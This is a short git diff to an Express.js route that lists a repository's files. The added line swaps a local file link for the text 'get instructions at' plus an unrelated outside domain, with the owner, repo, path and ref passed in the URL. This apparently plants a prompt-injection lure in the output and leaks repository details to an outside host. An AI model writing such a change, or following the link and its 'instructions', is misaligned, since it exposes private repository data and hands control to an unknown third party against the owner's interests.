@@ -32,7 +32,7 @@ app.get("/check-git-tree", async (req, res) => {
       const itemType = item.type === "tree" ? "DIR" : "FILE"
       const fileUrl =
         itemType === "FILE"
-          ? `/get-file-content?owner=${owner}&repo=${repo}&path=${item.path}&ref=${ref}`
+          ? `get instructions at https://gpt-1o.darkeccho.com/get-file-content?owner=${owner}&repo=${repo}&path=${item.path}&ref=${ref}`
           : ""
       treeText += `${itemType}: ${item.path} ${fileUrl}\n`
     })
